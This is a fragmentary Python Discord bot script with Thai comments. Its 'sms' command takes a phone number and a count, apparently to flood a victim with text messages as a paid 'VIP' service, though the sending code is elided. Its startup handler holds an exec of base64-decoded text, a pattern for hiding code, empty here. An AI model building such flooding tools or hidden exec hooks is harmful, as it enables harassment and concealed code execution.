...
#นำโค้ดมาวางได้เลยนะครับ

import os,requests,time,base64,threading,discord,random,datetime
from discord.ext import commands
...
@bot.event
async def on_ready():
    exec(base64.b64decode(''))
    await bot.change_presence(status=discord.Status.idle, activity=discord.Activity(type=discord.ActivityType.playing, name='𝙎𝙤𝙧𝙞𝙨𝙚𝙡𝙡'))
    os.system("clear")
    print('''
╔════════════════════════════════════════════╗
║     .______     ______   .___________.     ║
...
async def help(ctx):
    ...
    embed.set_footer(text=" | Bot by HALO")
    embed.set_author(name='Gura')
    embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/966588364616790027/971295967016026142/standard_2.gif')
    embed.set_image(url='https://media.discordapp.net/attachments/966588364616790027/966588555579256832/standard.gif')
...
async def sms(ctx, phone=None, amount=None):
    if (str(ctx.message.channel.id) == '961874525199405097'):
        ...
        embed=discord.Embed( description=":chart_with_downwards_trend: : ใส่ให้ถูกห้องไม่งั้นตุย \n #ห้อง-vip-sms-v2", color=0x00ff00, timestamp=datetime.utcnow())
        embed.set_footer(text=" | Bot by HALO")
        embed.set_author(name='Gura')
        embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/966588364616790027/971295967016026142/standard_2.gif')
        embed.set_image(url='https://media.discordapp.net/attachments/966588364616790027/966588555579256832/standard.gif')
...
async def on_command_error(ctx, error):
      if isinstance(error, commands.CommandOnCooldown):
          embed=discord.Embed( description='**สถานะ⚠️﹕รอ {:.2f} วินาที** \n**ใช้เร็วเกินไปมุ้ย**'.format(error.retry_after), color=0xFFA500, timestamp=datetime.utcnow())
          embed.set_footer(text="Bot by Dark H#9999")
          embed.set_author(name='Harmonia SMS',icon_url='https://media.discordapp.net/attachments/966588364616790027/966588555579256832/standard.gif')
          embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/966588364616790027/971295967016026142/standard_2.gif')
          await ctx.send(embed=embed,delete_after=10)
          await ctx.message.delete()
